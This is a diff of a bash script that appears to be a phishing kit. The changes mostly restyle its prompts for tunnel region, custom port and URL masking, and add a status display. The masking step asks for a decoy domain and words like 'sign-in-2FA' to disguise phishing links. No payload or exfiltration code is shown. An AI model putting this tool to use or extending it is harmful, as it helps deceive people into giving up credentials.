@@ -444,8 +444,8 @@ ngrok_token_setup(){
 }
 ngrok_region() {
         echo -e ""
-        echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION ${NF} : ${NC}"
-        temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
+        echo -e "  ${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION ${NF} : ${NC}"
+        temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in) ${NA}${YELLOW}>> ")"
 	read -p "${temprompt}" ngrokregion
 	case $ngrokregion in
 	"us" | "US")
@@ -472,7 +472,7 @@ start_ngrok() {
         setup_site
 	echo -e "\n"
 	ngrokregion="us"
-        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION (Y/n) ${YELLOW}>> ${NA}")"
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION (Y/n) ${NA}${YELLOW}>> ${NA}")"
 	read -p "${temprompt}"
 	case $REPLY in
 	1 | Y | y | yes | Yes | YES)
@@ -614,7 +614,7 @@ start_loclx() {
 	{ clear; banner; echo -e ""; }
         setup_site
 	echo -e "\n"
-        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE NGROK SERVER REGION (Y/eu/us/N)${YELLOW}>> ${NA}")"
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE NGROK SERVER REGION (Y/eu/us/N)${NA}${YELLOW}>> ${NA}")"
 	read -n1 -p "${temprompt}" opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
@@ -683,7 +683,7 @@ cusport() {
         echo -e ""
         echo -e ""
         PORT=4444
-        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}${YELLOW} >> ${NC}"
+        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}${YELLOW} >> ${BLUE}"
         echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
         echo -e ""
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
@@ -695,7 +695,7 @@ cusport() {
 	1 | Y | y | yes | Yes | YES)
                 echo -e ""
                 echo -e ""
-                temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NA}${YELLOW}>> ${NC}")"
+                temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NA}${YELLOW}>> ${BLUE}")"
 		read -p "${temprompt}" cport
 		PORT="${cport}";;
 	*)
@@ -825,11 +825,21 @@ checklink() {
 ## URL MASKING
 cusurl(){
 	{ clear; banner; echo -e " "; }
+        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}https://${rdurl}${NA}"
+        echo -e ""
+        echo -e ""
         echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
         echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
         echo -e "" 
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+        echo -e ""
         temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
 	read -p "${temprompt}" CUS_URI
 	case $CUS_URI in
@@ -853,12 +863,13 @@ cusurl(){
                 esac
 }
 shorten_keystocks(){
-        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL : ${NF} : ${NA}"
-        echo -e "$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
+        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL ${NA}${YELLOW}>> ${NA}"
+        temprompt="$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
 	read -p "${temprompt}" CUS_URL
 	checkurl ${CUS_URL}
 	echo -e " "
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${YELLOW})${GREEN} : ${YELLOW}" Keystks #KEY_STOCKS
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Enter Some KeyStocks (eg: sign-in-2FA)${YELLOW} >> ${BLUE}")"
+	read -p "${temprompt}" Keystks #KEY_STOCKS
 	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
 		shorten
 	else
@@ -945,7 +956,7 @@ displaylocalhost(){
         echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
         echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
+        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}https://${rdurl}${NA}"
         echo -e ""
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
 }
